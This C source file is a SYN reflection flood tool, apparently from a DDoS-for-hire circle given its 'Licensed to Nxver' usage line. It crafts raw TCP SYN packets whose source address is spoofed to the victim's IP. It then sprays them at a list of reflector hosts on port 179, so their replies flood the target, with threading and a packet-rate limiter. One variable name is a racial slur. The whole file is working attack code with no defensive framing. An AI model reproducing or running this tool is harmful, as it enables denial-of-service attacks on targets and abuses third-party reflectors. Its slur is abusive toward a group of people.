/* 
    syn tfo here
 */

#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
struct list
{
    struct sockaddr_in data;
    struct list *next;
    struct list *prev;
};
struct list *head;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data{ int thread_id; int dport; struct list *list_node; struct sockaddr_in sin; };
void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
        x++;
        c++;
        }
        return (Q[i] = r - x);
}
int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1;
    } else {
        low_num = max_num + 1;
        hi_num = min_num;
    }


    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}
unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
 
        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}
void setup_ip_header(struct iphdr *iph)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htonl(54321);
        iph->frag_off = htons(0x4000);
        iph->ttl = MAXTTL;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = inet_addr("192.168.3.100");
}
void setup_tcp_header(struct tcphdr *tcph)
{
        tcph->source = htons(5678);
        tcph->seq = rand();
        tcph->ack_seq = htons((rand() % (141511 - 1024 + 1)) + 1024);
        tcph->res2 = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(512);
        tcph->check = 0;
        tcph->urg_ptr = 0;
}
void *flood(void *par1)
{
        struct thread_data *td = (struct thread_data *)par1;
        char datagram[MAX_PACKET_SIZE];
        struct iphdr *iph = (struct iphdr *)datagram;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
        struct sockaddr_in sin = td->sin;
        struct  list *list_node = td->list_node;
        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
        if(s < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
        }
        memset(datagram, 0, MAX_PACKET_SIZE);
        setup_ip_header(iph);
        setup_tcp_header(tcph);
        tcph->dest = htons(80);
        iph->saddr = sin.sin_addr.s_addr;
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
        int tmp = 1;
        int niggershot = 30120;
        const int *val = &tmp;
        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
        }
        init_rand(time(NULL));
        register unsigned int i;
        i = 0;
        while(1){
        tcph->check = 0;
        tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);
        tcph->dest = htons(179);
        //iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        list_node = list_node->next;
        iph->daddr = list_node->data.sin_addr.s_addr;
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
        tcph->source = htons((rand() % (64511 - 1024 + 1)) + 1024);
        tcph->dest = htons(179);
        tcph->check = tcpcsum(iph, tcph);
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
        pps++;
        if(i >= limiter)
        {
        i = 0;
        usleep(sleeptime);
        }
        i++;
        }
}
int main(int argc, char *argv[ ])
{
    if(argc < 5){
        fprintf(stdout, "Usage: %s <target IP> <reflectors list> <threads> <pps limiter, -1 for no limit> <time>\nMethods by @yfork - Licensed to Nxver\n", argv[0]);
        exit(-1);
    }
    srand(time(NULL));
    int i = 0;
    head = NULL;
    fprintf(stdout, "Setting up sockets...\n");
    int max_len = 128;
    char *buffer = (char *) malloc(max_len);
    buffer = memset(buffer, 0x00, max_len);
    int num_threads = atoi(argv[3]);
    int maxpps = atoi(argv[4]);
    limiter = 0;
    pps = 0;
    int multiplier = 20;
    FILE *list_fd = fopen(argv[2],  "r");
    while (fgets(buffer, max_len, list_fd) != NULL) {
        if ((buffer[strlen(buffer) - 1] == '\n') ||
                (buffer[strlen(buffer) - 1] == '\r')) {
            buffer[strlen(buffer) - 1] = 0x00;
            if(head == NULL)
            {
                head = (struct list *)malloc(sizeof(struct list));
                bzero(&head->data, sizeof(head->data));
                head->data.sin_addr.s_addr=inet_addr(buffer);
                head->next = head;
                head->prev = head;
            } else {
                struct list *new_node = (struct list *)malloc(sizeof(struct list));
                memset(new_node, 0x00, sizeof(struct list));
                new_node->data.sin_addr.s_addr=inet_addr(buffer);
                new_node->prev = head;
                new_node->next = head->next;
                head->next = new_node;
            }
            i++;
        } else {
            continue;
        }
    }
    struct list *current = head->next;
    pthread_t thread[num_threads];
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(argv[1]);
    struct thread_data td[num_threads];
    for(i = 0;i<num_threads;i++){
        td[i].thread_id = i;
        td[i].sin= sin;
        td[i].dport= floodport;
        td[i].list_node = current;
        pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
    }
    fprintf(stdout, "Starting flood...\n");
    for(i = 0;i<(atoi(argv[5])*multiplier);i++)
    {
        usleep((1000/multiplier)*1000);
        if((pps*multiplier) > maxpps)
        {
            if(1 > limiter)
            {
                sleeptime+=100;
            } else {
                limiter--;
            }
        } else {
            limiter++;
            if(sleeptime > 25)
            {
                sleeptime-=25;
            } else {
                sleeptime = 0;
            }
        }
        pps = 0;
    }
    return 0;
}